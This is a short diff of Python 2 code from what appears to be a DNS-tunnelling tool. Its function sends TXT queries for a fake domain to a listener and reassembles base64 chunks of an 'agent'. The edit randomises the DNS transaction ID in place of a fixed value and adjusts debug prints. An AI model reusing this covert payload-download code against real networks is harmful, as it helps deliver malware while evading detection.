@@ -804,7 +804,8 @@ def extract_payload(payload):
     return label
     
 def recv_data_from_listener(prefix, sock, fake_domain, host, port):
-    txn_int = int("e347",16)
+    #txn_int = int("e347",16)
+    txn_int = random.randint(60000,65535)
     agent_base64 = []
     agent_tmp = ''
 
@@ -821,6 +822,7 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
             sock.sendto(txt_request,(host,int(port)))
             counter += 1
             sock.settimeout(5)
+            print "sending TXT request with hostname {}".format(host)
             agent_tmp,server_rcpt=sock.recvfrom(512)
             # TODO check for TXT response with TXT stop transfer hostname
             if is_end_of_transfer(agent_tmp):
@@ -830,7 +832,7 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
             #print "B64 " + str(b64_label)
             txn_int += 1
             agent_base64.append(b64_label)
-            print "b64_label: {}".format(b64_label)
+            #print "b64_label: {}".format(b64_label)
         except socket.timeout:
             pass
     ba = bytearray()
